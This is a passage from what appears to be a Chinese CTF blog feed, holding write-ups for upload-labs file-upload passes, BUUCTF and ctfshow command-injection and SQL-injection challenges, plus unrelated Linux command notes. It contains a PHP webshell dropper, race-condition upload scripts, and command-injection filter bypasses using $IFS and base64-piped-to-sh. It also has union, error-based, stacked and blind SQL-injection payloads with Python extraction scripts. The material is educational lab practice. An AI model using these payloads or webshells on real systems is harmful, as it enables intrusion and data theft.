title="Pass15"></a>Pass15</h3><p><strong>image_type_to_extension</strong> 根据指定的图像类型返回对应的后缀名</p><p>和14关的做法一致</p><h3 id="Pass16"><a href="#Pass16" class="headerlink" title="Pass16"></a>Pass16</h3><p><strong>exif_imagetype()</strong> 判断一个图像的类型,读取一个图像的第一个字节并检查其签名。</p><p>本函数可用来避免调用其它 exif函数用到了不支持的文件类型上或和 [$_SERVER’HTTP_ACCEPT’] 结合使用来检查浏览器是否可以显示某个指定的图像。需要开启 php_exif模块</p><p>和14关做法一致</p><h3 id="Pass17二次渲染绕过"><a href="#Pass17二次渲染绕过" class="headerlink" title="Pass17二次渲染绕过"></a>Pass17二次渲染绕过</h3><p><strong>imagecreatefromjpeg（）函数</strong> 二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符&#x2F;图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败。</p><p>imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。</p><p>所以二次渲染绕过就是把原图和他修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分。</p><p>这里有个小提示，对于做文件上传之二次渲染建议用GIF图片，相对于简单一点。上传正常的GIF图片下载回显的图片，用编辑器进行对比两个GIF图片内容，找到相同的地方（指的是上传前和上传后，两张图片的部分Hex仍然保持不变的位置）并插入PHP一句话，上传带有PHP一句话木马的GIF图片</p><p>可以参考 <a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p><h3 id="Pass18条件竞争"><a href="#Pass18条件竞争" class="headerlink" title="Pass18条件竞争"></a>Pass18条件竞争</h3><p>第十八关主要是对条件竞争的考察，我们看代码他是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。</p><p>我们可以利用burp多线程发包，然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。把木马php文件通过burp一直不停的重放，然后再写python脚本去不停的访问我们上传的这个文件，总会有那么一瞬间是还没来得及删除就可以被访问到的。</p><p>操作：首先，我们上传PHP文件，我们把木马换一下改为：</p><pre><code>&lt;?php fputs(fopen(&#39;Tony.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;Tony&quot;])?&gt;&#39;);?&gt;</code></pre><p>这样一旦访问到该文件就会在当前目录下生成一个<code>Tony.php</code>的一句话，就不必被删除了。</p><p>用BP拦截</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/192630.png" class=""><p>然后点击<code>Clear$</code>，接着设置无限发送空的<code>Payloads</code>，来让它一直上传该文件</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/193036.png" class=""><p>可以把并发请求数设置高一点</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/193626.png" class=""><p>然后我们写一个python脚本，通过它来不停的访问我们上传上去的PHP文件</p><pre><code class="python">import requestsurl = &quot;http://xxx.xxx.xxx.xxx/upload-labs/upload/haha.php&quot;while True:    html = requests.get(url)    if html.status_code == 200:        print(&quot;OK&quot;)        break</code></pre><p>接下来我们可以在BP点击开始攻击，同时我们也要运行python脚本，当出现OK说明访问到了该文件，那么Tony.php应该也创建成功了。</p><p>参考<a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">https://blog.csdn.net/weixin_47598409/article/details/115050869</a></p><h3 id="Pass19"><a href="#Pass19" class="headerlink" title="Pass19"></a>Pass19</h3><p>第十九关的上传路径有点问题，不是上传到了upload里面，建议修改一下，进入第十九关，找到myupload.php文件，如图所示修改。改完后要重启靶场</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/201031.png" class=""><p>这关是先检查了后缀名，然后上传，然后在进行二次渲染。这时我们只能上传图片马，而且得配合apache解析漏洞或文件包含进行通关</p><p>这关和上一关操作差不多，不过得改一下python脚本：</p><p>import requests</p><pre><code>url = &quot;http://xxx.xxx.xxx.xxx/upload-labs/include.php/?file=./upload/haha.pngwhile True:    html = requests.get(url)    if html.status_code == 200:        print(&quot;OK&quot;)        break</code></pre><p>这里注意一下最后访问的URL为<a href="http://xxx.xxx.xxx.xxx/upload-labs/Tony.php">http://xxx.xxx.xxx.xxx/upload-labs/Tony.php</a></p><h3 id="Pass20-x2F-绕过"><a href="#Pass20-x2F-绕过" class="headerlink" title="Pass20 &#x2F;.绕过"></a>Pass20 &#x2F;.绕过</h3><p>move_uploaded_file()会忽略掉文件末尾的<code>/.</code></p><p><code>save_name</code> 可控，就可以直接将文件名写成haha.php&#x2F;.</p><p>也可以用%00截断绕过</p><h3 id="Pass21"><a href="#Pass21" class="headerlink" title="Pass21"></a>Pass21</h3><p>参考别人得wp：</p><pre><code>这一关白名单验证过程：--&gt; 验证上传路径是否存在--&gt; 验证[&#39;upload_file&#39;]的content-type是否合法（可以抓包修改）--&gt; 判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）--&gt;判断file不是数组则使用explode(&#39;.&#39;, strtolower($file))对file进行切割，将file变为一个数组--&gt; 判断数组最后一个元素是否合法--&gt; 数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name--&gt; 上传文件</code></pre><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/210539.png" class=""><p>上传一句话png，burp抓包并改包：</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/210652.png" class=""><pre><code>修改POST参数为数组类型，索引[0]为`haha.php`，索引[2]为`jpg|png|gif`。 只要第二个索引`不为1`，$file[count($file) - 1]就等价于$file[2-1]，值为空</code></pre><p>最后，服务端就成功存在了haha.php</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行(混合)</title>
      <link href="/2023/04/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(%E6%B7%B7%E5%90%88)/"/>
      <url>/2023/04/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(%E6%B7%B7%E5%90%88)/</url>
      
        <content type="html"><![CDATA[<h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>先测目录，发现在根目录有flag文件</p><pre><code>target=127.0.0.1;ls ../../../</code></pre><img src="/2023/04/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(%E6%B7%B7%E5%90%88)/101305.png" class=""><p>查看文件，爆出flag</p><pre><code>target=127.0.0.1;cat ../../../flag</code></pre><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>进去有个提示&#x2F;?ip，get一下发现和前面一道题差不多</p><p>命令联合执行：</p><pre><code>;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）</code></pre><p>通配符：</p><pre><code>*#匹配全部字符，通配符?#任意一个字符，通配符[]#表示一个范围（正则，通配符）&#123;&#125;#产生一个序列（通配符）</code></pre><p>ls就发现了flag.php和index.php，但测试了一下很多东西都被过滤了，空格只能用$IFS$1绕过，flag也被ban了，我们来尝试一下index.php:</p><img src="/2023/04/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(%E6%B7%B7%E5%90%88)/103747.png" class=""><pre><code>总结过滤的特殊字符&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#39; &quot; \ () [] &#123;&#125;  空格&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </code></pre><p>1、变量替换</p><pre><code>?ip=127.0.0.1;b=g;cat$IFS$1fla$b.php//这里的变量替换顺序要注意，不然又被贪婪匹配ban了</code></pre><p>2、变量ab互换传递，绕过字符串匹配，实现拼接</p><pre><code>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</code></pre><p>3、内联执行</p><pre><code>?ip=127.0.0.1;cat$IFS`ls`?ip=127.0.0.1;cat$IFS$3`ls`</code></pre><p>4、被过滤的bash，用管道+sh替换</p><pre><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  //cat flag.php用base64加密来绕过正则匹配?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash //bash被ban了</code></pre><h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p>这道题只有一个eval($_POST[“Syc”]);，可以直接用蚁剑连接</p>]]></content>
      
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入(混合)</title>
      <link href="/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/"/>
      <url>/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/</url>
      
        <content type="html"><![CDATA[<h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>这道题测出来是单引号闭合，也没有上面过滤，直接用万能密码就能爆出flag</p><pre><code>payload ?username=admin&#39; or 1=1-- -&amp;password=admin</code></pre><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>对查询点进行fuzz测试发现很多关键字都被过滤了</p><img src="/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/222647.png" class=""><p>回包长度为500的都是可以正常使用的，这里;没有被过滤，尝试堆叠注入</p><p>首先show tables;</p><img src="/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/224429.png" class=""><p>然后show columns from Flag;，不行，被过滤了。</p><p>参考别人wp <a href="https://blog.csdn.net/StevenOnesir/article/details/110203051%EF%BC%8C%E6%9C%89%E4%B8%A4%E7%A7%8D%E8%A7%A3%E6%B3%95">https://blog.csdn.net/StevenOnesir/article/details/110203051，有两种解法</a></p><p>解法1：</p><p>输入数字只回显1，输入字母啥也不回显，那么我们应该推出后端代码有 或 结构，而且不直接回显flag，但作为一道题目，from应该是from flag，所以猜测后端代码为：</p><pre><code>select $_POST[&#39;query&#39;] || flag from flag</code></pre><p>所以payload就变的简单：</p><pre><code>*，1</code></pre><p>这里，我们的语句变成了</p><pre><code>select *，1 from flag</code></pre><p>select 1 的意思是建立一个临时列，这个列的列名为1，所有初始值都被设为1。</p><p>解法2：</p><p>通过修改SQL配置将或运算符||设置为连接符</p><pre><code>payload 1;set sql_mode=pipes_as_concat;select 1</code></pre><p>要注意分号隔断了前面的命令，所以要再次添加select!!</p><p>上面的payload等同于</p><pre><code>select concat(1,flag) from Flag</code></pre><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>测出来username有注入点，用单引号闭合。</p><p>测数据库名</p><pre><code>username=-1&#39; union select 1,2,database()-- -&amp;password=admin//库名为geek</code></pre><p>测表名</p><pre><code>username=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39; -- -&amp;password=admin//表名为geekuser,l0ve1ysq1</code></pre><p>两个表里面都有id,uername,password</p><p>最终在l0ve1ysq1表里找到了flag</p><pre><code>username=-1&#39; union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from l0ve1ysq1)-- -&amp;password=admin</code></pre><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>测出来也是单引号闭合，但用order by 3测试时发现报错时”der 3”，说明or和by被过滤，使用双拼即可绕过，这道题几乎所有关键字都可以用双拼绕过，先查库名：</p><pre><code>?username=-1&#39; uunionnion seselectlect 1,2,database()-- -&amp;password=admin//geek</code></pre><p>再查表明：</p><pre><code>?username=-1&#39; ununionion seselectlect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema=&#39;geek&#39; -- -&amp;password=admin//b4bsql,geekuser</code></pre><p>再查字段：</p><pre><code>username=-1&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39; -- -&amp;password=admin//id,username,password</code></pre><p>最终在b4bsql表里找到了flag</p><pre><code>?username=-1&#39; ununionion seselectlect 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) frfromom b4bsql -- -&amp;password=admin</code></pre><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>搞了一圈发现连()都过滤了，看别人wp才发现源码有个注释：</p><pre><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5base32解码：c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==base64解码：select * from user where username = &#39;$name&#39;</code></pre><pre><code>Base64和Base32 区别：base64中包含大写字母（A-Z），小写字母（a-z），数字0—9以及+/；base32中只包含大写字母（A-Z）和数字234567</code></pre><p>同时，这一关利用sqli的特性：<strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p><p>所以，如果我们使用联合查询访问，一个真实存在的用户名和一个我们自己编造的密码，就会使虚拟数据混淆admin密码，从而使我们成功登录，得到 flag</p><p>我们这题可以测出有三个列，按照报错回显，可以确定第二个列是username,第三个列是password，那么第一列应该是id，我们尝试构造出：</p><pre><code>name=1&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&amp;pw=1</code></pre><p>如果你看过这题的源代码就会发现，密码是要于数据库中被md5加密过的密码进行对比的，所以我们第三列的字符串是1的md5值。</p><h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>测试了一下union,空格都被过滤了，试试报错注入，空格用括号代替：</p><pre><code>?username=-1&#39;or(updatexml(1,concat(0x7e,database()),1))%23&amp;password=adminusername=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password=admin//geek</code></pre><p>测表名，等号也被过滤了，用like代替</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like&#39;geek&#39;)),1)%23&amp;password=admin//H4rDsq1</code></pre><p>测字段</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#39;H4rDsq1&#39;)),1)%23&amp;password=admin//id,username,password</code></pre><p>爆数据</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(concat_ws(0x7e,username,password)))from(H4rDsq1))),1)%23&amp;password=admin//~flag~flag&#123;53f3bd9d-f44f-4ce5-a0</code></pre><p>可以看到，只出来了左半部分，使用right()：</p><pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(right(group_concat(concat_ws(0x7e,username,password)),20))from(H4rDsq1))),1)%23&amp;password=admin//~5-a0c8-2720a6d31213&#125;</code></pre><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>用order by 测出有两列数据，继续union select 1,2时发现爆出了过滤的字符：</p><img src="/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/155441.png" class=""><p>用extractvalue也只能注出库名</p><p>试试堆叠注入，测库名：</p><pre><code>inject=1&#39;;show databases;</code></pre><img src="/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/161321.png" class=""><p>测表名：</p><pre><code>?inject=1&#39;;show tables;</code></pre><img src="/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/161643.png" class=""><p>测字段，如果tableName是纯数字，需要用&#96;包裹：</p><pre><code>?inject=1&#39;;show columns from `1919810931114514`;</code></pre><img src="/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/170603.png" class=""><p>然后就无能为力，看看大佬wp</p><p><strong>解法一：</strong></p><p>可以看到words表里有两个属性，即两列：id 和data<br>而1919810931114514表里只有一个属性列<br>说明输入框可能查询的就是words表<br>后台sql语句可能为</p><pre><code>select id,data from words where id=</code></pre><p>接下来就是如何获取flag了，思路是把1919810931114514表改名为words表，把属性名flag改为id，然后用1’ or 1&#x3D;1;# 显示flag出来，在这之前当然要先把words表改名为其他</p><pre><code>1&#39;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);#</code></pre><p><strong>解法二：</strong></p><p> 因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：</p><pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#</code></pre><p>关于预编译，可以参考：<a href="https://www.cnblogs.com/geaozhang/p/9891338.html">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p><p><strong>解法三</strong>：</p><p>还是预编译，不过我们可以将sql语句直接进行16进制编码</p><pre><code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</code></pre><p>注：prepare…from…是预处理语句，会进行编码转换。</p><p>​    SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</p><p><strong>解法四：</strong></p><p>此题还可以通过handle直接出答案：</p><pre><code>1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</code></pre><pre><code class="text">打开表：HANDLER 表名 OPEN ;查看数据：HANDLER 表名 READ next;关闭表：HANDLER 表名 READ CLOSE;</code></pre><p>可以参考 <a href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>屏蔽了alter和prepare。还可以使用上一道题的第三种方法。</p><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>这道题输入1和2会输出不同的话，输入其他数字会显示Error Occured When Fetch Result.</p><p>尝试报错注入发现只显示bool(false)，所以我们试试盲注，这道题过滤了空格，用括号可以代替：</p><pre><code>id=if(1=1,1,2)//Hello, glzjin wants a girlfriend.id=if(1=2,1,2)//Do you want to be my girlfriend?</code></pre><p>发现可以用布尔盲注，题目提示了flag在flag表里的flag字段里，直接爆数据：</p><pre><code>id=if(ascii(substr((select(flag)from(flag)),1,1))&gt;1,1,2)</code></pre><p>脚本：</p><pre><code>import requestsif __name__ == &#39;__main__&#39; :    url = &#39;http://bb5603db-211d-4c37-9796-e7a42349e7c8.node4.buuoj.cn:81/index.php&#39;    result = &#39;&#39;    i = 0    while True:        i = i + 1        low = 32        high = 127        while low &lt; high:            mid = (low + high) // 2            payload = f&#39;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&#39;            data = &#123;                &quot;id&quot;:payload            &#125;            r = requests.post(url=url,data=data)            if &#39;Hello&#39; in r.text:                low = mid + 1            else:                high = mid        if low != 32:            result += chr(low)        else:            break        print(result)</code></pre><h3 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h3><p>这道题很坑，在登录框里瞎注了半天，没有头绪，最后看别人wp才知道注入点在那几个按妞的地方</p><p>分别点击那几个按钮你就会发现url里的id会变，这就是注入点，get型注入，而且这道题是数字型注入</p><p>测试了一下发现过滤了空格，#，and，order by，union啥的，所以我们试试用括号和异或来进行代替</p><pre><code>?id=0^(ascii(substr((select(database())),1,1))&gt;2)</code></pre><img src="/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/172434.png" class=""><p>可以看到返回结果与id&#x3D;1一样，可以成功绕过，基于此，我们可以用脚本进行注入：</p><pre><code class="python">import requestsimport timeif __name__ == &#39;__main__&#39; :    url = &#39;http://cf3b0295-5066-4352-aa2b-51ccb07a38c5.node4.buuoj.cn:81/search.php?id=0^&#39;    result = &#39;&#39;    i = 0    while True:        i = i + 1        low = 32        high = 130        while low &lt; high:            mid = (low + high) // 2            #爆库名            #payload = f&#39;(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #爆表名                #payload=f&#39;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;geek&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #爆字段            #payload = f&#39;(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;geek&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #爆数据           #payload=f&#39;(ascii(substr((select(group_concat(concat_ws(&quot;~&quot;,username,password)))from(F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;                     r = requests.get(url=url+payload)            time.sleep(0.05)            if &#39;others&#39; in r.text:                low = mid + 1            else:                high = mid        if low!=32:            result += chr(low)        else:            break        print(result) </code></pre><p>这里要注意的是time.sleep()，请求过快可能不能响应，需要加点延时。</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux学习</title>
      <link href="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/04/14/linux%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>一、linux文件与目录结构</p><p>1.linux文件</p><p>​linux 系统中一切皆文件</p><p>2.linux 目录结构</p><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/11230.jpg" class=""><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/11231.png" class=""><p>二、vi&#x2F;vim编辑器</p><p>1、普通模式</p><p>2、编辑模式</p><p>3、命令模式</p><pre><code>命令  功能:w  保存:q  退出:wq  保存并退出:q!  不保存强制退出:set nu    显示行号:set nonu   关闭行号/要查找的词 n   查找下一个，N 往上查找:noh     取消高亮显示</code></pre><p>三、常用基本命令</p><p>1、帮助命令</p><p>​man获得帮助信息</p><p>​help获得shell内置命令的帮助信息（系统加载启动后随着shell一起加载，常驻系统内存中，这部分命令被称为内置命令,使用type查看命令类型）</p><p>2、文件目录类</p><p>（1）pwd 显示当前工作目录路径</p><p>（2）cd 切换路径</p><p>（3）ls 列出目录的内容</p><p>​-a全部的文件，连同隐藏档（开头为 . 的文件）一起列出来</p><p>​-l 长数据列出，包含文件的属性与权限等等数据，等同与”ll”</p><p>（4）mkdir 创建一个新的文件夹</p><p>（5）rmdir 删除一个空的文件夹</p><p>（6）touch 创建空文件</p><p>（7）cp 复制文件或目录</p><p>​cp  test.txt  ..&#x2F;home&#x2F;afdsf&#x2F;将test.txt复制到..&#x2F;home&#x2F;afdsf目录下</p><p>​cp  test.txt  ..&#x2F;home&#x2F;dsaf.txt将test.txt中的内容覆盖到dsaf.txt</p><p>​cp  -r  a&#x2F;  &#x2F;home&#x2F;afdsf&#x2F;将a目录复制到afdsf目录下</p><p>（8）rm 删除文件或目录</p><p>​-r递归删除目录中的所有内容</p><p>​-f强制执行删除操作。而不是提示进行确认</p><p>（9）mv 移动文件与目录或重命名</p><p>​mv  inital.txt  &#x2F;home&#x2F;dfds&#x2F;  移动文件</p><p>​mv  inital.txt  &#x2F;home&#x2F;dfds&#x2F;1.txt  将inital.txt移动并且重命名为1.txt</p><p>（10）cat 查看文件内容</p><p>​-n显示所有行的行号，包括空行</p><p>（11）more 文件内容分屏查看器</p><p>（12）less  分屏显示文件内容（比more更强大）</p><p>（13）echo 输出内容到控制台</p><p>​-e支持反斜线控制的字符转换</p><p>（14）&gt; 输出重定向和 &gt;&gt; 追加</p><p>​ls -l &gt; a.txt（列表的内容写入文件a.txt中（覆盖写））</p><p>​ls -ll &gt;&gt; a.txt （列表的内容追加到文件a.txt的末尾）</p><p>​cat 文件1 &gt; 文件2（将文件1的内容覆盖到文件2）</p><p>（15）head 显示文件头部内容</p><p>​head用于显示文件开头部分内容，默认情况下head指令显示文件的前10行内容</p><p>​-n&lt;行数&gt; 指定显示头部内容的行数</p><p>（16）tail 输出文件尾部内容</p><p>​tail -n 5 文件查看文件尾部5行内容</p><p>​tail -f 文件实时追踪该文档的所有更新</p><p>（17）ln 软链接软链接也称为符号链接，类似于windows里的快捷方式，主要存放了链接其他文件的路径</p><p>（18）history 查看历史命令</p><p>​history -c 清空历史命令</p><p>3、时间日期类</p><p>​date 查看当天日期</p><p>​cal 查看日历</p><p>4、用户管理命令</p><p>​（1）useradd 添加新用户</p><p>​useradd 用户名（添加新用户）</p><p>​useradd  -g  组名  用户名（添加新用户到某个组）</p><p>​（2）passwd 设置用户密码</p><p>​password 用户名</p><p>​（3）id 查看用户是否存在</p><p>​（4）cat  &#x2F;etc&#x2F;password  查看系统中的用户信息</p><p>​（5）su 切换用户</p><p>​（6）who 查看登录用户信息</p><p>​whoami  查看当前登录用户信息</p><p>​who am i  查看原始登录用户（有空格）</p><p>​（7）</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行(ctfshow)</title>
      <link href="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/"/>
      <url>/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h1><h2 id="类型一-变量c来接受并过滤传入的数据-eval函数来执行"><a href="#类型一-变量c来接受并过滤传入的数据-eval函数来执行" class="headerlink" title="类型一:变量c来接受并过滤传入的数据,eval函数来执行"></a>类型一:变量c来接受并过滤传入的数据,eval函数来执行</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>使用通配符*或?或’’等等绕过flag</p><pre><code>payload 1.c=system(&quot;cat f*&quot;);2.c=echo `cat f*`;3.c=echo `nl fl&#39;&#39;ag.php`;或c=echo `nl fl&quot;&quot;ag.php`;//nl命令在linux系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号4.c=echo `nl fl\ag.php`;   //转义字符绕过5.c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php //通过变量赋值直接绕过c的过滤?ip=127.0.0.1;cat `ls` //内联执行，就是将反引号内命令的输出作为输入执行cp fla&#123;g.php,G&#125;    //把flag.php复制为flaG</code></pre><p>可以读取文件的函数：</p><pre><code>readfile()读取文件 highlight_file()读文件 show_source()同上 base64_decode()base64解码 strrev()反转字符串include()文件包含，可以不使用括号require()完全可以替代include()</code></pre><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code>payload ?c=echo `cat f*`;</code></pre><p>其他可代替system函数：</p><pre><code>system()passthru() exec() shell_exec() popen() proc_open()pcntl_exec() 反引号 同shell_exec()</code></pre><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code>payload c=echo%09`tac%09f*`;</code></pre><p>文件读取命令</p><pre><code>more:一页一页的显示档案内容less:与 more 类似 head:查看头几行tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示tail:查看尾几行nl:显示内容，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:文件排序并输出也可以查看内容uniq:可以查看 file -f:报错出具体内容grepgrep &#123; flag.php打印有”&#123;“的一行strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings。通常用法：strings\$IFS\$9f*(必须加转义字符)paste把每个文件以列对列的方式，一列列地加以合并sed一种编辑器，可以用sed -f flag.php读取flagawkcurlcut</code></pre><p>linux绕过空格</p><pre><code>cat%09flag  